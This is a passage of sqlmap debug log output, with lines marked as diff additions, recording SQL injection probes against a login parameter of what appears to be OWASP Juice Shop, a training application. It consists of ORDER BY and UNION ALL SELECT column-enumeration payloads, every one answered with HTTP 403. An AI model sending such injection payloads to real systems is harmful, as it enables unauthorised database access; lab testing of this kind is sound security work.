+[17:14:46] [DEBUG] skipping test 'HSQLDB > 2.0 time-based blind - Parameter replace (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Informix time-based blind - Parameter replace (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind - ORDER BY clause (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_LOCK.SLEEP)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'HSQLDB >= 1.7.2 time-based blind - ORDER BY, GROUP BY clause (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'HSQLDB > 2.0 time-based blind - ORDER BY, GROUP BY clause (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[17:14:46] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[17:14:46] [PAYLOAD] admin@juice-sh.op) ORDER BY 1-- wVfL
+[17:14:46] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:14:46] [PAYLOAD] admin@juice-sh.op) ORDER BY 2741-- oCgw
+[17:14:46] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:14:46] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL-- RzvB
+[17:14:47] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:14:47] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL-- NLjf
+[17:14:47] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:14:47] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL-- XDwy
+[17:14:48] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:14:48] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL-- kMrN
+[17:14:48] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:14:48] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- BzdI
+[17:14:48] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:14:48] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- lzIG
+[17:14:49] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:14:49] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- rZgp
+[17:14:51] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:14:51] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- AZTA
+[17:15:12] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:15:12] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- HfBp
+[17:15:12] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:15:12] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- TLvZ
+[17:15:12] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:15:12] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- EQog
+[17:15:13] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:15:13] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- vaHH
+[17:15:13] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:15:13] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Hnfw
+[17:15:14] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:15:14] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- MHUI
+[17:15:18] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:15:18] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- FfVs
+[17:15:41] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:15:41] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- qJVM
+[17:15:41] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:15:41] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- YSay
+[17:16:01] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:16:01] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- trNW
+[17:16:02] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:16:02] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- sTxh
+[17:16:03] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:16:03] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- OCKA
+[17:16:24] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:16:24] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
+[17:16:24] [PAYLOAD] -8155) ORDER BY 1-- BqLq
+[17:16:24] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:16:24] [PAYLOAD] -4485) ORDER BY 9264-- Iqjc
+[17:16:25] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:16:25] [PAYLOAD] -9334) UNION ALL SELECT 9802-- qnWM
+[17:16:25] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:16:25] [PAYLOAD] -6216) UNION ALL SELECT 5894,5894-- uLAg
+[17:16:26] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:16:26] [PAYLOAD] -1900) UNION ALL SELECT 9139,9139,9139-- fdMi
+[17:16:26] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:16:26] [PAYLOAD] -6203) UNION ALL SELECT 2792,2792,2792,2792-- bEvC
+[17:16:27] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:16:27] [PAYLOAD] -6413) UNION ALL SELECT 1912,1912,1912,1912,1912-- EVpu
+[17:16:27] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:16:27] [PAYLOAD] -5078) UNION ALL SELECT 5598,5598,5598,5598,5598,5598-- ceXL
+[17:16:28] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:16:28] [PAYLOAD] -3273) UNION ALL SELECT 1852,1852,1852,1852,1852,1852,1852-- vBwv
+[17:16:28] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:16:28] [PAYLOAD] -6339) UNION ALL SELECT 5397,5397,5397,5397,5397,5397,5397,5397-- OYCY
+[17:16:29] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:16:29] [PAYLOAD] -6323) UNION ALL SELECT 2388,2388,2388,2388,2388,2388,2388,2388,2388-- LZsJ
+[17:16:29] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:16:29] [PAYLOAD] -6848) UNION ALL SELECT 7488,7488,7488,7488,7488,7488,7488,7488,7488,7488-- HJbz
+[17:16:33] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:16:33] [PAYLOAD] -9927) UNION ALL SELECT 1660,1660,1660,1660,1660,1660,1660,1660,1660,1660,1660-- gbGd
+[17:16:37] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:16:37] [PAYLOAD] -3152) UNION ALL SELECT 9916,9916,9916,9916,9916,9916,9916,9916,9916,9916,9916,9916-- zpdv
+[17:16:40] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:16:40] [PAYLOAD] -4271) UNION ALL SELECT 1477,1477,1477,1477,1477,1477,1477,1477,1477,1477,1477,1477,1477-- Ovcm
+[17:16:44] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:16:44] [PAYLOAD] -1522) UNION ALL SELECT 4568,4568,4568,4568,4568,4568,4568,4568,4568,4568,4568,4568,4568,4568-- YWis
+[17:16:48] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:16:48] [PAYLOAD] -6746) UNION ALL SELECT 6787,6787,6787,6787,6787,6787,6787,6787,6787,6787,6787,6787,6787,6787,6787-- CoQd
+[17:16:52] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:16:52] [PAYLOAD] -6506) UNION ALL SELECT 7520,7520,7520,7520,7520,7520,7520,7520,7520,7520,7520,7520,7520,7520,7520,7520-- qPuj
+[17:16:56] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:16:56] [PAYLOAD] -3172) UNION ALL SELECT 6620,6620,6620,6620,6620,6620,6620,6620,6620,6620,6620,6620,6620,6620,6620,6620,6620-- Nyuz
+[17:17:00] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:17:00] [PAYLOAD] -2787) UNION ALL SELECT 2342,2342,2342,2342,2342,2342,2342,2342,2342,2342,2342,2342,2342,2342,2342,2342,2342,2342-- DbYC
+[17:17:03] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:17:03] [PAYLOAD] -5207) UNION ALL SELECT 1436,1436,1436,1436,1436,1436,1436,1436,1436,1436,1436,1436,1436,1436,1436,1436,1436,1436,1436-- MvsY
+[17:17:07] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:17:07] [PAYLOAD] -4548) UNION ALL SELECT 3841,3841,3841,3841,3841,3841,3841,3841,3841,3841,3841,3841,3841,3841,3841,3841,3841,3841,3841,3841-- irgV
+[17:17:12] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:17:12] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
+[17:17:12] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- LPWa
+[17:17:16] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:17:16] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- wHmT
+[17:17:19] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:17:19] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Tqhg
+[17:17:22] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:17:22] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- AbLA
+[17:17:26] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:17:26] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- IXvf
+[17:17:30] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:17:30] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- oCvJ
+[17:17:34] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:17:34] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- opqy
+[17:17:37] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:17:37] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Fugx
+[17:17:42] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:17:42] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- sJSd
+[17:17:44] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:17:44] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- bFiX
+[17:17:48] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:17:48] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ONjU
+[17:17:52] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:17:52] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- CqTA
+[17:17:56] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:17:56] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- yktn
+[17:18:00] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:18:00] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ZQOw
+[17:18:04] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:18:04] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- RMNj
+[17:18:07] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:18:07] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- VobI
+[17:18:10] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:18:10] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- kRpT
+[17:18:15] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:18:15] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- TNyU
+[17:18:18] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:18:18] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- gfdA
+[17:18:22] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:18:22] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- gQgU
+[17:18:26] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:18:26] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
+[17:18:26] [PAYLOAD] -2010) UNION ALL SELECT 1587,1587,1587,1587,1587,1587,1587,1587,1587,1587,1587,1587,1587,1587,1587,1587,1587,1587,1587,1587,1587-- GqWF
+[17:18:30] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:18:30] [PAYLOAD] -5289) UNION ALL SELECT 4283,4283,4283,4283,4283,4283,4283,4283,4283,4283,4283,4283,4283,4283,4283,4283,4283,4283,4283,4283,4283,4283-- mdHN
+[17:18:34] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:18:34] [PAYLOAD] -6296) UNION ALL SELECT 4154,4154,4154,4154,4154,4154,4154,4154,4154,4154,4154,4154,4154,4154,4154,4154,4154,4154,4154,4154,4154,4154,4154-- dxdk
+[17:18:39] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:18:39] [PAYLOAD] -9774) UNION ALL SELECT 3896,3896,3896,3896,3896,3896,3896,3896,3896,3896,3896,3896,3896,3896,3896,3896,3896,3896,3896,3896,3896,3896,3896,3896-- qlbk
+[17:18:42] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:18:42] [PAYLOAD] -5891) UNION ALL SELECT 1456,1456,1456,1456,1456,1456,1456,1456,1456,1456,1456,1456,1456,1456,1456,1456,1456,1456,1456,1456,1456,1456,1456,1456,1456-- wjpn
+[17:18:46] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:18:46] [PAYLOAD] -8695) UNION ALL SELECT 8054,8054,8054,8054,8054,8054,8054,8054,8054,8054,8054,8054,8054,8054,8054,8054,8054,8054,8054,8054,8054,8054,8054,8054,8054,8054-- cQHk
+[17:18:50] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:18:50] [PAYLOAD] -4243) UNION ALL SELECT 3262,3262,3262,3262,3262,3262,3262,3262,3262,3262,3262,3262,3262,3262,3262,3262,3262,3262,3262,3262,3262,3262,3262,3262,3262,3262,3262-- QOTL
+[17:18:55] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:18:55] [PAYLOAD] -3859) UNION ALL SELECT 1212,1212,1212,1212,1212,1212,1212,1212,1212,1212,1212,1212,1212,1212,1212,1212,1212,1212,1212,1212,1212,1212,1212,1212,1212,1212,1212,1212-- irYJ
+[17:18:59] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:18:59] [PAYLOAD] -5568) UNION ALL SELECT 3421,3421,3421,3421,3421,3421,3421,3421,3421,3421,3421,3421,3421,3421,3421,3421,3421,3421,3421,3421,3421,3421,3421,3421,3421,3421,3421,3421,3421-- gVHb
+[17:19:04] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:19:04] [PAYLOAD] -7715) UNION ALL SELECT 2935,2935,2935,2935,2935,2935,2935,2935,2935,2935,2935,2935,2935,2935,2935,2935,2935,2935,2935,2935,2935,2935,2935,2935,2935,2935,2935,2935,2935,2935-- Lzlq
+[17:19:08] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:19:08] [PAYLOAD] -2264) UNION ALL SELECT 1172,1172,1172,1172,1172,1172,1172,1172,1172,1172,1172,1172,1172,1172,1172,1172,1172,1172,1172,1172,1172,1172,1172,1172,1172,1172,1172,1172,1172,1172,1172-- VOXh
+[17:19:13] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:19:13] [PAYLOAD] -7928) UNION ALL SELECT 3997,3997,3997,3997,3997,3997,3997,3997,3997,3997,3997,3997,3997,3997,3997,3997,3997,3997,3997,3997,3997,3997,3997,3997,3997,3997,3997,3997,3997,3997,3997,3997-- ZNnx
+[17:19:16] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:19:16] [PAYLOAD] -7073) UNION ALL SELECT 8021,8021,8021,8021,8021,8021,8021,8021,8021,8021,8021,8021,8021,8021,8021,8021,8021,8021,8021,8021,8021,8021,8021,8021,8021,8021,8021,8021,8021,8021,8021,8021,8021-- mnSz
+[17:19:21] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:19:21] [PAYLOAD] -9057) UNION ALL SELECT 1288,1288,1288,1288,1288,1288,1288,1288,1288,1288,1288,1288,1288,1288,1288,1288,1288,1288,1288,1288,1288,1288,1288,1288,1288,1288,1288,1288,1288,1288,1288,1288,1288,1288-- sPBP
+[17:19:26] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:19:26] [PAYLOAD] -1057) UNION ALL SELECT 4513,4513,4513,4513,4513,4513,4513,4513,4513,4513,4513,4513,4513,4513,4513,4513,4513,4513,4513,4513,4513,4513,4513,4513,4513,4513,4513,4513,4513,4513,4513,4513,4513,4513,4513-- ZpzW
+[17:19:30] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:19:30] [PAYLOAD] -8748) UNION ALL SELECT 6404,6404,6404,6404,6404,6404,6404,6404,6404,6404,6404,6404,6404,6404,6404,6404,6404,6404,6404,6404,6404,6404,6404,6404,6404,6404,6404,6404,6404,6404,6404,6404,6404,6404,6404,6404-- dmgB
+[17:19:35] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:19:35] [PAYLOAD] -5543) UNION ALL SELECT 7661,7661,7661,7661,7661,7661,7661,7661,7661,7661,7661,7661,7661,7661,7661,7661,7661,7661,7661,7661,7661,7661,7661,7661,7661,7661,7661,7661,7661,7661,7661,7661,7661,7661,7661,7661,7661-- LboE
+[17:19:40] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:19:40] [PAYLOAD] -6704) UNION ALL SELECT 3659,3659,3659,3659,3659,3659,3659,3659,3659,3659,3659,3659,3659,3659,3659,3659,3659,3659,3659,3659,3659,3659,3659,3659,3659,3659,3659,3659,3659,3659,3659,3659,3659,3659,3659,3659,3659,3659-- aEhh
+[17:19:45] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:19:45] [PAYLOAD] -3934) UNION ALL SELECT 3657,3657,3657,3657,3657,3657,3657,3657,3657,3657,3657,3657,3657,3657,3657,3657,3657,3657,3657,3657,3657,3657,3657,3657,3657,3657,3657,3657,3657,3657,3657,3657,3657,3657,3657,3657,3657,3657,3657-- bfet
+[17:19:50] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:19:50] [PAYLOAD] -3571) UNION ALL SELECT 8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638-- yiOu
+[17:19:55] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:19:55] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
+[17:19:55] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- QfPU
+[17:19:59] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:19:59] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Lgzg
+[17:20:03] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:20:03] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- RVmu
+[17:20:06] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:20:06] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Ppns
+[17:20:20] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:20:20] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- xcBs
+[17:20:20] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:20:20] [PAYLOAD] admin@juice-sh.op) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- dihw
